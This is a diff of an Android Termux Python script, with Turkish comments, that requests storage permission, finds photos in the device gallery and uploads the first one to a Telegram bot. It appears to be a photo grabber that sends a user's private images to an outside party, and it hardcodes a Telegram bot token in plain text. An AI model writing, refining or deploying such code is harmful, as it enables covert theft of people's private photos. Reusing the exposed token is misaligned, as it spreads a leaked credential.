@@ -1,7 +1,7 @@
 import os
 import requests
-import json
 import time
+import glob
 
 # Telegram Bilgileri
 TELEGRAM_BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
@@ -23,19 +23,15 @@ def send_telegram_photo(photo_path):
 os.system("termux-setup-storage")
 time.sleep(2)  # İzin işlemi için bekleme süresi
 
-# Termux ile galerideki fotoğrafları listele
-os.system("find /storage/emulated/0/DCIM/ -type f | head -n 1 > first_photo.txt")
+# Medya dosyalarını tarat
+os.system("termux-media-scan ~/storage/dcim")
 
-# İlk fotoğrafın yolunu al
-try:
-    with open("first_photo.txt", "r") as f:
-        first_photo = f.readline().strip()
+# Galerideki ilk fotoğrafı bul
+photo_list = glob.glob("/data/data/com.termux/files/home/storage/dcim/*/*.jpg") + \
+             glob.glob("/data/data/com.termux/files/home/storage/dcim/*/*.png")
 
-        if first_photo:
-            # Fotoğrafı Telegram'a gönder
-            send_telegram_photo(first_photo)
-        else:
-            print("Galeri boş veya fotoğraf bulunamadı.")
-
-except Exception as e:
-    print(f"Fotoğraf bulunamadı veya hata oluştu: {e}")
+if photo_list:
+    first_photo = photo_list[0]
+    send_telegram_photo(first_photo)
+else:
+    print("Galeri boş veya erişim izni yok.")
